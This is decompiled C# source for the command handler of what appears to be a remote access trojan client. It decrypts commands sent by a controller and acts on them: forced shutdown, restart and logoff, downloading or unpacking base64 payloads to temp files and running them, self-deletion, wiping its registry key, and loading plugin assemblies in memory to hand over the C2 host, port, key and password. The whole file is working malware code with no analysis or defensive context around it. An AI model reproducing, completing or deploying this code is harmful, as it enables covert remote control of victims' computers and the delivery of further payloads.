using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Client_0._5.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace Client_0._5;

public class C_Commands
{
	private static object SPL = C_Settings.SPL;

	private static C_Socket C = new C_Socket();

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void Data(byte[] b)
	{
		string[] array = Strings.Split(Conversions.ToString(C_Encryption.AES_Decrypt(C_Fuctions.BS(b))), Conversions.ToString(SPL), -1, (CompareMethod)0);
		try
		{
			switch (array[0])
			{
			case "PC-OUT":
				Interaction.Shell("Shutdown /l /f /t 00", (AppWinStyle)0, false, -1);
				break;
			case "CPL":
				if (Operators.CompareString(C_Fuctions.GTV(array[1]), (string)null, false) == 0)
				{
					NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.AddObject(Operators.AddObject((object)"GPL", SPL), (object)array[1]) }, (string[])null, (Type[])null, (bool[])null, true);
				}
				else
				{
					Plugin(Convert.FromBase64String(C_Fuctions.GTV(array[1])));
				}
				break;
			case "ping":
				C_Socket.Send("ping");
				break;
			case "Visit":
				Process.Start(array[1]);
				break;
			case "RunDisk":
			{
				string text2 = Path.GetTempFileName() + Path.GetExtension(array[1]);
				File.WriteAllBytes(text2, Convert.FromBase64String(array[2]));
				Thread.Sleep(1000);
				Process.Start(text2);
				if (Operators.CompareString(array[3].ToString(), "update", false) == 0)
				{
					C_Installation.DEL();
				}
				break;
			}
			case "Uninstall":
				Registry.CurrentUser.DeleteSubKeyTree("Software\\" + C_ID.HWID());
				C_Installation.DEL();
				break;
			case "PC-RES":
				Interaction.Shell("Shutdown /r /f /t 00", (AppWinStyle)0, false, -1);
				break;
			case "Reconnect":
			{
				Type typeFromHandle = typeof(Process);
				object[] obj = new object[1] { C_Settings.fullpath };
				object[] array2 = obj;
				bool[] obj2 = new bool[1] { true };
				bool[] array3 = obj2;
				NewLateBinding.LateCall((object)null, typeFromHandle, "Start", obj, (string[])null, (Type[])null, obj2, true);
				if (array3[0])
				{
					C_Settings.fullpath = RuntimeHelpers.GetObjectValue(array2[0]);
				}
				ProjectData.EndApp();
				break;
			}
			case "Close":
				ProjectData.EndApp();
				break;
			case "PC-SHUT":
				Interaction.Shell("Shutdown /s /f /t 00", (AppWinStyle)0, false, -1);
				break;
			case "RunURL":
			{
				string text = Path.GetTempFileName() + array[2].ToString();
				((ServerComputer)MyProject.Computer).get_Network().DownloadFile(array[1], text);
				Thread.Sleep(1000);
				Process.Start(text);
				if (Operators.CompareString(array[3].ToString(), "update", false) == 0)
				{
					C_Installation.DEL();
				}
				break;
			}
			case "IPL":
				C_Fuctions.STV(array[2], array[1]);
				Plugin(Convert.FromBase64String(C_Fuctions.GTV(array[2])));
				break;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			NewLateBinding.LateCall((object)C, (Type)null, "Send", new object[1] { Operators.AddObject(Operators.AddObject(Operators.AddObject((object)"MSG", SPL), (object)"Error! "), (object)ex2.Message) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.ClearProjectError();
		}
	}

	public static void Plugin(byte[] B)
	{
		try
		{
			Type[] types = AppDomain.CurrentDomain.Load(B).GetTypes();
			for (int i = 0; i < types.Length; i = checked(i + 1))
			{
				MethodInfo[] methods = types[i].GetMethods();
				foreach (MethodInfo methodInfo in methods)
				{
					if (Operators.CompareString(methodInfo.Name, C_Fuctions.BS(new byte[2] { 82, 67 }), false) == 0)
					{
						methodInfo.Invoke(null, new object[9]
						{
							C_Settings.HOST,
							C_Settings.PORT,
							C_Socket.KEY,
							C_Socket.SPL,
							C_Settings.PASS,
							C_Settings.fullpath,
							C_ID.HWID(),
							C_ID.Bot(),
							C_Encryption.AES_Decrypt(C_Settings.Pastebin)
						});
					}
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
